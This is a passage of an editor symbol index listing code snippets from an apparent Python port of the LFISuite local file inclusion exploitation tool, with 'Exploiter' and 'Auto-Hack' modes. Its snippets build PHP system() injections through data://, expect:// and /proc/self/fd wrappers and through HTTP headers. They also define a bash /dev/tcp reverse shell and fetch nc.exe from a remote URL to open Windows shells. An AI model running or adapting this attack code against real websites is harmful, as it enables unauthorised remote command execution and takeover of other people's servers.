        "peekOfCode": "def send_data_cmd_simple_sl(cmd, url):\n    # print \"requested URL: %sdata://,%s\" %(url,cmd)\n    return send_data_cmd_generic(\"%sdata://,%s\" % (url, cmd))\ndef send_data_cmd_b64_nosl(cmd, url):\n    enc = base64.b64encode(cmd)\n    # print \"requested URL: %sdata:,%s\" %(url,enc)\n    return send_data_cmd_generic(\"%sdata:text/plain;base64,%s\" % (url, enc))\ndef send_data_cmd_b64_sl(cmd, url):\n    enc = base64.b64encode(cmd)\n    # print \"requested URL: %sdata://text/plain;base64,%s\" %(url,enc)",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "send_data_cmd_b64_nosl",
        "kind": 2,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "def send_data_cmd_b64_nosl(cmd, url):\n    enc = base64.b64encode(cmd)\n    # print \"requested URL: %sdata:,%s\" %(url,enc)\n    return send_data_cmd_generic(\"%sdata:text/plain;base64,%s\" % (url, enc))\ndef send_data_cmd_b64_sl(cmd, url):\n    enc = base64.b64encode(cmd)\n    # print \"requested URL: %sdata://text/plain;base64,%s\" %(url,enc)\n    return send_data_cmd_generic(\"%sdata://text/plain;base64,%s\" % (url, enc))\ndef send_data_cmd_default(cmd, url, choice):\n    if choice == 1:",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "send_data_cmd_b64_sl",
        "kind": 2,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "def send_data_cmd_b64_sl(cmd, url):\n    enc = base64.b64encode(cmd)\n    # print \"requested URL: %sdata://text/plain;base64,%s\" %(url,enc)\n    return send_data_cmd_generic(\"%sdata://text/plain;base64,%s\" % (url, enc))\ndef send_data_cmd_default(cmd, url, choice):\n    if choice == 1:\n        return send_data_cmd_simple_nosl(cmd, url)\n    elif choice == 2:\n        return send_data_cmd_b64_nosl(cmd, url)\n    elif choice == 3:",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "send_data_cmd_default",
        "kind": 2,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "def send_data_cmd_default(cmd, url, choice):\n    if choice == 1:\n        return send_data_cmd_simple_nosl(cmd, url)\n    elif choice == 2:\n        return send_data_cmd_b64_nosl(cmd, url)\n    elif choice == 3:\n        return send_data_cmd_simple_sl(cmd, url)\n    else:\n        return send_data_cmd_b64_sl(cmd, url)\ndef extract_data_res(resp):",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "extract_data_res",
        "kind": 2,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "def extract_data_res(resp):\n    return extract_phpinput_res(resp)\ndef cleanDataCmd(cmd):\n    newcmd = \"AbracadabrA ** <?php \"\n    if cmd[:6] != \"php://\":\n        if reverseConn not in cmd:\n            cmds = cmd.split(\"&\")\n            for c in cmds:\n                if len(c) > 0:\n                    newcmd += \"system('%s');\" % c",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "cleanDataCmd",
        "kind": 2,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "def cleanDataCmd(cmd):\n    newcmd = \"AbracadabrA ** <?php \"\n    if cmd[:6] != \"php://\":\n        if reverseConn not in cmd:\n            cmds = cmd.split(\"&\")\n            for c in cmds:\n                if len(c) > 0:\n                    newcmd += \"system('%s');\" % c\n        else:\n            b64cmd = base64.b64encode(cmd)",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "run_data",
        "kind": 2,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "def run_data():\n    global ahactive\n    global ahurl\n    global data_reverse\n    global victimOs\n    if ahactive is False:\n        odataurl = input(\n            \"[*] Enter the 'data://' vulnerable url (ex: 'http://site/index.php?page=') -> \"\n        )\n    else:",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "windows_expect_reverse_shell",
        "kind": 2,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "def windows_expect_reverse_shell(oexpecturl):\n    if initWindowsReverse():\n        cmd = \"echo %s > %s\" % (wget_js_content, wget_filename)\n        cleanOutput(\n            extract_expect_res(\n                send_expect_cmd(\"AbracadabrA ** %s **\" % cmd, oexpecturl)\n            ),\n            False,\n        )\n        cscript = \"cscript /nologo %s %s\" % (wget_filename, netcat_url)",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "expect_reverse_shell",
        "kind": 2,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "def expect_reverse_shell(oexpecturl):\n    generic_reverse_shell()\n    print(\n        cleanOutput(\n            extract_expect_res(\n                send_expect_cmd(\"AbracadabrA ** %s **\" %\n                                reverseConn, oexpecturl)\n            ),\n            False,\n        )",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "send_expect_cmd",
        "kind": 2,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "def send_expect_cmd(cmd, url):\n    newurl = \"%sexpect://%s\" % (url, cmd)\n    if expect_reverse:\n        content = (requests.get(newurl, headers=gen_headers)).text\n    else:\n        content = (requests.get(newurl, headers=gen_headers, timeout=15)).text\n    return content\ndef extract_expect_res(resp):\n    return extract_phpinput_res(resp)\ndef run_expect():",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "extract_expect_res",
        "kind": 2,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "def extract_expect_res(resp):\n    return extract_phpinput_res(resp)\ndef run_expect():\n    global ahactive\n    global ahurl\n    global expect_reverse\n    global victimOs\n    if ahactive is False:\n        oexpecturl = input(\n            \"[*] Enter the 'expect://' vulnerable url (ex: 'http://site/index.php?page=') -> \"",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "run_expect",
        "kind": 2,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "def run_expect():\n    global ahactive\n    global ahurl\n    global expect_reverse\n    global victimOs\n    if ahactive is False:\n        oexpecturl = input(\n            \"[*] Enter the 'expect://' vulnerable url (ex: 'http://site/index.php?page=') -> \"\n        )\n    else:",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "fd_reverse_shell",
        "kind": 2,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "def fd_reverse_shell(errPage, field, ofdurl):\n    global reverseConn\n    generic_reverse_shell()\n    print(\n        \"%s\\n\"\n        % cleanOutput(\n            extract_fd_Result(send_self_fd_cmd(\n                errPage, reverseConn, field, ofdurl)),\n            False,\n        )",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "send_self_fd_cmd",
        "kind": 2,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "def send_self_fd_cmd(errPage, cmd, field, ofdurl):\n    if \"php://\" in cmd:\n        cmd = \"%s **<?php %s\" % (fd_pre_rand_str, cmd)\n        if \";\" not in cmd[-2:]:\n            cmd = \"%s;\" % cmd\n        cmd = \"%s ?> **\"\n    else:\n        cmd = '%s **<?php system(\"%s\"); ?> **' % (fd_pre_rand_str, cmd)\n    fd_headers[field] = cmd\n    r = requests.get(errPage, headers=fd_headers, timeout=15)",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "extract_fd_Result",
        "kind": 2,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "def extract_fd_Result(resp):\n    indexes = SubstrFind(resp, \"%s **\" % fd_pre_rand_str)\n    got = \"\"\n    if len(indexes) > 0:\n        content = resp[(indexes[len(indexes) - 1] + 17):]\n        i = 0\n        while i < len(content):\n            if content[i] == \"*\" and content[i + 1] == \"*\":\n                break\n            got += content[i]",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "self_fd_control",
        "kind": 2,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "def self_fd_control(resp, toFind):\n    got = extract_fd_Result(resp)\n    return toFind in got\ndef run_self_fd():\n    global ahactive\n    global ahfd_errPage\n    if ahactive is False:\n        ofdurl = input(\n            \"[*] Enter the '/proc/self/fd' vulnerable url (ex: 'http://site/index.php?page=/proc/self/fd/9') -> \"\n        )",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "run_self_fd",
        "kind": 2,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "def run_self_fd():\n    global ahactive\n    global ahfd_errPage\n    if ahactive is False:\n        ofdurl = input(\n            \"[*] Enter the '/proc/self/fd' vulnerable url (ex: 'http://site/index.php?page=/proc/self/fd/9') -> \"\n        )\n        errPage = input(\n            \"\\n[*] Enter a page to request which will produce an error visible in '%s' (ex: 'http://site/robots.txt') -> \"\n            % ofdurl",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "scanner",
        "kind": 2,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "def scanner():\n    global ahactive\n    global ahpaths\n    global ahlogs\n    global ahenv\n    global ahfd\n    global ahgen\n    global ahcnf\n    print(colored(\"\\n.:: LFI Scanner ::.\\n\", \"white\"))\n    fname = input(",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "run_autoHack",
        "kind": 2,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "def run_autoHack():\n    global ahurl\n    global ahactive\n    global ahpaths\n    global ahlogs\n    global ahfd\n    global ahenv\n    global ahcnf\n    global ahgen\n    global ahenvurl",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "netcat_url",
        "kind": 5,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "netcat_url = \"https://github.com/D35m0nd142/LFISuite/raw/master/nc.exe\"\nLFS_V3n0M_VERSION = \"1.1\"  # DO NOT MODIFY THIS FOR ANY REASON!!\n# --------- Auto-Hack Global Variables ----------#\nahactive = False\nahurl = \"\"\nahenvurl = \"\"\nahlogurl = \"\"\nahfdurl = \"\"\nahwebsite = \"\"\nahfd_errPage = \"\"",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "LFS_V3n0M_VERSION",
        "kind": 5,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "LFS_V3n0M_VERSION = \"1.1\"  # DO NOT MODIFY THIS FOR ANY REASON!!\n# --------- Auto-Hack Global Variables ----------#\nahactive = False\nahurl = \"\"\nahenvurl = \"\"\nahlogurl = \"\"\nahfdurl = \"\"\nahwebsite = \"\"\nahfd_errPage = \"\"\nahpath = \"\"",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "ahactive",
        "kind": 5,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "ahactive = False\nahurl = \"\"\nahenvurl = \"\"\nahlogurl = \"\"\nahfdurl = \"\"\nahwebsite = \"\"\nahfd_errPage = \"\"\nahpath = \"\"\nahpaths = []\nahlogs = []",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "ahurl",
        "kind": 5,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "ahurl = \"\"\nahenvurl = \"\"\nahlogurl = \"\"\nahfdurl = \"\"\nahwebsite = \"\"\nahfd_errPage = \"\"\nahpath = \"\"\nahpaths = []\nahlogs = []\nahfd = []",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "ahenvurl",
        "kind": 5,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "ahenvurl = \"\"\nahlogurl = \"\"\nahfdurl = \"\"\nahwebsite = \"\"\nahfd_errPage = \"\"\nahpath = \"\"\nahpaths = []\nahlogs = []\nahfd = []\nahenv = []",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "ahlogurl",
        "kind": 5,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "ahlogurl = \"\"\nahfdurl = \"\"\nahwebsite = \"\"\nahfd_errPage = \"\"\nahpath = \"\"\nahpaths = []\nahlogs = []\nahfd = []\nahenv = []\nahcnf = []",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "ahfdurl",
        "kind": 5,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "ahfdurl = \"\"\nahwebsite = \"\"\nahfd_errPage = \"\"\nahpath = \"\"\nahpaths = []\nahlogs = []\nahfd = []\nahenv = []\nahcnf = []\nahgen = []",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "ahwebsite",
        "kind": 5,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "ahwebsite = \"\"\nahfd_errPage = \"\"\nahpath = \"\"\nahpaths = []\nahlogs = []\nahfd = []\nahenv = []\nahcnf = []\nahgen = []\n# -----------------------------------------------#",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "ahfd_errPage",
        "kind": 5,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "ahfd_errPage = \"\"\nahpath = \"\"\nahpaths = []\nahlogs = []\nahfd = []\nahenv = []\nahcnf = []\nahgen = []\n# -----------------------------------------------#\n# ------------------ Reverse shell ------------------ #",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "ahpath",
        "kind": 5,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "ahpath = \"\"\nahpaths = []\nahlogs = []\nahfd = []\nahenv = []\nahcnf = []\nahgen = []\n# -----------------------------------------------#\n# ------------------ Reverse shell ------------------ #\n# for Windows",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "ahpaths",
        "kind": 5,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "ahpaths = []\nahlogs = []\nahfd = []\nahenv = []\nahcnf = []\nahgen = []\n# -----------------------------------------------#\n# ------------------ Reverse shell ------------------ #\n# for Windows\nwget_filename = \"\"",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "ahlogs",
        "kind": 5,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "ahlogs = []\nahfd = []\nahenv = []\nahcnf = []\nahgen = []\n# -----------------------------------------------#\n# ------------------ Reverse shell ------------------ #\n# for Windows\nwget_filename = \"\"\nnc_filename = \"\"",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "ahfd",
        "kind": 5,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "ahfd = []\nahenv = []\nahcnf = []\nahgen = []\n# -----------------------------------------------#\n# ------------------ Reverse shell ------------------ #\n# for Windows\nwget_filename = \"\"\nnc_filename = \"\"\nwget_js_content = \"\"",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "ahenv",
        "kind": 5,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "ahenv = []\nahcnf = []\nahgen = []\n# -----------------------------------------------#\n# ------------------ Reverse shell ------------------ #\n# for Windows\nwget_filename = \"\"\nnc_filename = \"\"\nwget_js_content = \"\"\n# for Windows",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "ahcnf",
        "kind": 5,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "ahcnf = []\nahgen = []\n# -----------------------------------------------#\n# ------------------ Reverse shell ------------------ #\n# for Windows\nwget_filename = \"\"\nnc_filename = \"\"\nwget_js_content = \"\"\n# for Windows\ndef initWindowsReverse():",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "ahgen",
        "kind": 5,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "ahgen = []\n# -----------------------------------------------#\n# ------------------ Reverse shell ------------------ #\n# for Windows\nwget_filename = \"\"\nnc_filename = \"\"\nwget_js_content = \"\"\n# for Windows\ndef initWindowsReverse():\n    global wget_filename",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "wget_filename",
        "kind": 5,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "wget_filename = \"\"\nnc_filename = \"\"\nwget_js_content = \"\"\n# for Windows\ndef initWindowsReverse():\n    global wget_filename\n    global wget_js_content\n    global nc_filename\n    if len(wget_filename) > 0 and len(nc_filename) > 0:\n        return False",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "nc_filename",
        "kind": 5,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "nc_filename = \"\"\nwget_js_content = \"\"\n# for Windows\ndef initWindowsReverse():\n    global wget_filename\n    global wget_js_content\n    global nc_filename\n    if len(wget_filename) > 0 and len(nc_filename) > 0:\n        return False\n    wget_num = generateRandom()[11:]",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "wget_js_content",
        "kind": 5,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "wget_js_content = \"\"\n# for Windows\ndef initWindowsReverse():\n    global wget_filename\n    global wget_js_content\n    global nc_filename\n    if len(wget_filename) > 0 and len(nc_filename) > 0:\n        return False\n    wget_num = generateRandom()[11:]\n    nc_num = generateRandom()[11:]",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "reverseConn",
        "kind": 5,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "reverseConn = \"bash -i >& /dev/tcp/?/12340 0>&1\"\nvictimOs = \"\"\ndef windows_reverse_shell():\n    global reverseConn\n    if \"?\" in reverseConn:\n        print(\n            colored(\n                \"[WARNING] Make sure to have your netcat listening ('nc -lvp port') before going ahead.\",\n                \"red\",\n            )",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "victimOs",
        "kind": 5,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "victimOs = \"\"\ndef windows_reverse_shell():\n    global reverseConn\n    if \"?\" in reverseConn:\n        print(\n            colored(\n                \"[WARNING] Make sure to have your netcat listening ('nc -lvp port') before going ahead.\",\n                \"red\",\n            )\n        )",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "gen_headers",
        "kind": 5,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "gen_headers = {\n    \"User-Agent\": \"Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201\",\n    \"Accept-Language\": \"en-US;\",\n    \"Accept-Encoding\": \"gzip, deflate\",\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;\",\n    \"Connection\": \"close\",\n}\n# noinspection PyPep8\ndef banner():\n    print(",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "se_url",
        "kind": 5,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "se_url = \"\"\nse_par = \"\"\nse_stopStr = \"\"\nse_header_par = \"\"\nse_phponly = False\nse_header_pars = [\n    \"HTTP_USER_AGENT\",\n    \"HTTP_ACCEPT\",\n    \"HTTP_ACCEPT_ENCODING\",\n    \"HTTP_ACCEPT_LANGUAGE\",",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "se_par",
        "kind": 5,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "se_par = \"\"\nse_stopStr = \"\"\nse_header_par = \"\"\nse_phponly = False\nse_header_pars = [\n    \"HTTP_USER_AGENT\",\n    \"HTTP_ACCEPT\",\n    \"HTTP_ACCEPT_ENCODING\",\n    \"HTTP_ACCEPT_LANGUAGE\",\n    \"HTTP_REFERER\",",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "se_stopStr",
        "kind": 5,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "se_stopStr = \"\"\nse_header_par = \"\"\nse_phponly = False\nse_header_pars = [\n    \"HTTP_USER_AGENT\",\n    \"HTTP_ACCEPT\",\n    \"HTTP_ACCEPT_ENCODING\",\n    \"HTTP_ACCEPT_LANGUAGE\",\n    \"HTTP_REFERER\",\n    \"HTTP_CONNECTION\",",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "se_header_par",
        "kind": 5,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "se_header_par = \"\"\nse_phponly = False\nse_header_pars = [\n    \"HTTP_USER_AGENT\",\n    \"HTTP_ACCEPT\",\n    \"HTTP_ACCEPT_ENCODING\",\n    \"HTTP_ACCEPT_LANGUAGE\",\n    \"HTTP_REFERER\",\n    \"HTTP_CONNECTION\",\n    \"HTTP_COOKIE\",",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "se_phponly",
        "kind": 5,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "se_phponly = False\nse_header_pars = [\n    \"HTTP_USER_AGENT\",\n    \"HTTP_ACCEPT\",\n    \"HTTP_ACCEPT_ENCODING\",\n    \"HTTP_ACCEPT_LANGUAGE\",\n    \"HTTP_REFERER\",\n    \"HTTP_CONNECTION\",\n    \"HTTP_COOKIE\",\n]",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "se_header_pars",
        "kind": 5,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "se_header_pars = [\n    \"HTTP_USER_AGENT\",\n    \"HTTP_ACCEPT\",\n    \"HTTP_ACCEPT_ENCODING\",\n    \"HTTP_ACCEPT_LANGUAGE\",\n    \"HTTP_REFERER\",\n    \"HTTP_CONNECTION\",\n    \"HTTP_COOKIE\",\n]\nse_header_conv = [",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "se_header_conv",
        "kind": 5,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "se_header_conv = [\n    \"User-Agent\",\n    \"Accept\",\n    \"Accept-Encoding\",\n    \"Accept-Language\",\n    \"Referer\",\n    \"Connection\",\n    \"Cookie\",\n]\nse_headers = gen_headers",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "se_headers",
        "kind": 5,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "se_headers = gen_headers\ndef se_reverse_shell():\n    generic_reverse_shell()\n    print(cleanOutput(execSeCmd(correctString(reverseConn)), False))\ndef getTranslatedPar(word):\n    global se_header_conv\n    global se_header_pars\n    for i in range(0, len(se_header_pars)):\n        if word == se_header_pars[i]:\n            return se_header_conv[i]",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "phpinfo_reverse",
        "kind": 5,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "phpinfo_reverse = False\ndef windows_phpinfo_reverse_shell(headers, lfipath, phpinfopath, host):\n    if initWindowsReverse():\n        cmd = \"echo %s > %s\" % (wget_js_content, wget_filename)\n        phpinfo_request(headers, cmd, lfipath, phpinfopath, 0, host)\n        cscript = \"cscript /nologo %s %s\" % (wget_filename, netcat_url)\n        phpinfo_request(headers, cscript, lfipath, phpinfopath, 0, host)\n    windows_reverse_shell()\n    print(phpinfo_request(headers, reverseConn, lfipath, phpinfopath, 0, host))\ndef phpinfo_reverse_shell(headers, lfipath, phpinfopath, host):",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "access_log_reverse",
        "kind": 5,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "access_log_reverse = False\ndef access_log_windows_reverse_shell(host, keyword, ologurl):\n    global access_log_reverse\n    access_log_reverse = True\n    if initWindowsReverse():\n        cmd = \"echo %s > %s\" % (wget_js_content, wget_filename)\n        send_access_log_cmd(cmd, host, keyword)\n        cscript = \"cscript /nologo %s %s\" % (wget_filename, netcat_url)\n        send_access_log_cmd(cscript, host, keyword)\n    windows_reverse_shell()",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "data_reverse",
        "kind": 5,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "data_reverse = False\ndef windows_data_reverse_shell(odataurl, found):\n    if initWindowsReverse():\n        cmd = \"echo %s > %s\" % (wget_js_content, wget_filename)\n        cleanOutput(\n            extract_data_res(send_data_cmd_default(\n                cleanDataCmd(cmd), odataurl, found)),\n            False,\n        )\n        cscript = \"cscript /nologo %s %s\" % (wget_filename, netcat_url)",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "expect_reverse",
        "kind": 5,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "expect_reverse = False\ndef windows_expect_reverse_shell(oexpecturl):\n    if initWindowsReverse():\n        cmd = \"echo %s > %s\" % (wget_js_content, wget_filename)\n        cleanOutput(\n            extract_expect_res(\n                send_expect_cmd(\"AbracadabrA ** %s **\" % cmd, oexpecturl)\n            ),\n            False,\n        )",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "fd_headers",
        "kind": 5,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "fd_headers = gen_headers\nbu_headers = fd_headers\nfd_pre_rand_str = generateRandom()\ndef fd_reverse_shell(errPage, field, ofdurl):\n    global reverseConn\n    generic_reverse_shell()\n    print(\n        \"%s\\n\"\n        % cleanOutput(\n            extract_fd_Result(send_self_fd_cmd(",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "bu_headers",
        "kind": 5,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "bu_headers = fd_headers\nfd_pre_rand_str = generateRandom()\ndef fd_reverse_shell(errPage, field, ofdurl):\n    global reverseConn\n    generic_reverse_shell()\n    print(\n        \"%s\\n\"\n        % cleanOutput(\n            extract_fd_Result(send_self_fd_cmd(\n                errPage, reverseConn, field, ofdurl)),",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "fd_pre_rand_str",
        "kind": 5,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "fd_pre_rand_str = generateRandom()\ndef fd_reverse_shell(errPage, field, ofdurl):\n    global reverseConn\n    generic_reverse_shell()\n    print(\n        \"%s\\n\"\n        % cleanOutput(\n            extract_fd_Result(send_self_fd_cmd(\n                errPage, reverseConn, field, ofdurl)),\n            False,",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "choice",
        "kind": 5,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
        "peekOfCode": "choice = \"4\"\nvalidChoice = choice == int(\"1\") or choice == int(\"2\") or choice == \"x\"\nwhile validChoice is False:\n    print(\"--------------------\")\n    print(\" [1] Exploiter       \")\n    print(\" [2] Scanner         \")\n    print(\" [3] Exit            \")\n    print(\"--------------------\")\n    choice = input(\" -> \")\n    if choice == \"3\":",
        "detail": "VulnScan.modules.lfisuite",
        "documentation": {}
    },
    {
        "label": "validChoice",
        "kind": 5,
        "importPath": "VulnScan.modules.lfisuite",
        "description": "VulnScan.modules.lfisuite",
